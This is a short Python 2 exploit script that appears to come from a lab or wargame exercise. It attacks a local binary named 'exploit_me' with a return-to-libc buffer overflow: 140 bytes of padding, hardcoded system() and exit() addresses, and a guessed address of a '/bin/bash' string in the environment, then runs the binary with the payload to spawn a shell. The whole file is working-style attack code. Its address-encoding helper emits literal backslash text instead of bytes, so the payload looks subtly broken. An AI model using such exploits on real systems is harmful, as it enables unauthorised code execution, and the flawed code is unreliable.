#!/usr/bin/env python2

import struct

def x(n):
    l = struct.pack('<I', n).encode('hex')
    l = '\\x' + '\\x'.join([l[i:i+2] for i in range(0, len(l), 2)])
    return l

import subprocess

payload = b'A' * 140
system = 0xb7e6b060
system = x(system)
payload += system
exit_addr = 0xb7e5ebe0
exit_addr = x(exit_addr)
payload += exit_addr
shell_addr = 0xBFFFF902 + 36 # SHELL=/bin/ba[sh]
for i in range(1):
    pshell_addr = shell_addr + i
    pshell_addr = x(pshell_addr)
    ppayload = payload + pshell_addr

    process = subprocess.Popen(["./exploit_me", ppayload])
    process.wait()
    print process.returncode
